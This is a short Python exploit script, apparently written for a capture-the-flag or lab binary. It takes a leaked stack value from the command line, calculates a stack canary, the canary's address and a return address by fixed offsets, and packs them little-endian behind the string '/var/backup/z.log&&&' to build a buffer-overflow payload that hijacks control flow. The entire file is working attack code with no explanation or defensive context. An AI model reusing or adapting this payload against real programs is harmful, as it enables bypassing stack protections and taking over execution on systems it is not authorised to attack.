import requests, sys, os
from requests import Request, Session,exceptions


split = sys.argv[1]

last40 = split[-40:]

returnaddress = str(hex(int(last40[32:40],16) + 1625))

temp =  int(last40[24:32],16) - 232
canaryaddress = str(hex(temp))

canary = str(hex(int(last40[0:8],16) + 38))

#address of char*
single_pointer= str(hex(int(last40[24:32],16) - 232))

data = b"/var/backup/z.log"
data += b"&&&"
data += bytes.fromhex(canaryaddress[2:])[::-1]

for i in range(0,9):
    data += bytes.fromhex(canaryaddress[2:])[::-1]

data += bytes.fromhex(canary[2:])[::-1]
data += bytes.fromhex(str(hex(int(last40[8:16],16)))[2:])[::-1]
data += bytes.fromhex(str(hex(int(last40[16:24],16)))[2:])[::-1]
data += bytes.fromhex(str(hex(int(last40[24:32],16)))[2:])[::-1]
data += bytes.fromhex(returnaddress[2:])[::-1]
data += bytes.fromhex(single_pointer[2:])[::-1]
data += bytes.fromhex(single_pointer[2:])[::-1]

print(data) 

